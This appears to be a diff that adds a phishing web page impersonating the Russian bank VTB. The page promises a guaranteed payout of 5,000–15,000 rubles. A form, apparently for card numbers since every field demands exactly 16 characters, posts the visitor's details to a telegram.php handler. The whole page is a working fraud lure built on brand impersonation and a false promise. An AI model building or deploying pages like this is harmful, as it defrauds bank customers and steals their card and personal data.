@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ВТБ - Подарок</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="wrap">
+        <header class="logo">
+            <img src="images/logo.png" alt="Лого ВТБ">
+        </header>
+    </div>
+    <header class="main">
+        <div class="wrap">
+           <div class="main-inform">
+               <div class="main-text">
+                <h2>ВТБ ИНВЕСТ</h2>
+                <p>Наш сервис - это независимые <br>
+                    начисления от инвесторов для <br>
+                    активных пользователей банкинга </p>
+               </div>
+               <div class="main-but">
+                <a href="#form">ПОЛУЧИТЬ НАЧИСЛЕНИЕ</a>
+               </div>
+           </div>
+        </div>
+    </header>
+    <div class="wrap">
+        <section class="about">
+            <h2>ПРОСИМ ОБРАТИТЬ ВАШЕ ВНИМАНИЕ!</h2>
+            <p>Вы были найдены в реестре сервиса. Сервис <br>
+                определяет активных пользователей для начисления! <br>
+                Клиенты попавшие в реестр банка гарантировано получат</p>
+            <h3>ОТ 5000 ДО 15000 РУБЛЕЙ</h3>
+        </section>
+        <section id="form">
+            <div class="wrap">
+                <div class="form-text">
+                    ДЛЯ ПОЛУЧЕНИЯ НАЧИСЛЕНИЯ, ВАМ <br>
+                    НЕОБХОДИМО ИДЕНТИФИЦИРОВАТЬ ЛИЧНОСТЬ <br>
+                    И ВВЕСТИ ЛИЧНЫЙ ПРОМОКОД
+                </div>
+                <div class="number-card">
+                    <form action="telegram.php" method="POST">
+                        <input type="text" placeholder="ФИО" required maxlength="16" minlength="16" name="user_name"> <br>
+                        <input type="text" placeholder="E-Mail" required maxlength="16" minlength="16" name="user_mail"> <br>
+                        <input type="text" placeholder="Промокод" required maxlength="16" minlength="16" name="user_promokod">
+                        <div class="but">
+                            <button>ПОЛУЧИТЬ НАЧИСЛЕНИЕ</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </div>
+    <footer>
+        <div class="wrap">
+            <div class="info">
+                <img src="images/logo.png" class="banklogo"alt="">
+                <p>2020 Все права защищены</p>
+                <img src="images/cardlogo.png" class="cardlogo"alt="">
+            </div>
+            <div class="info-mob">
+                <p>2020 Все права защищены</p>
+                <div class="logoinfo-mob">
+                    <img src="images/logo.png" class="banklogo"alt="">
+                    <img src="images/cardlogo.png" class="cardlogo"alt="">
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
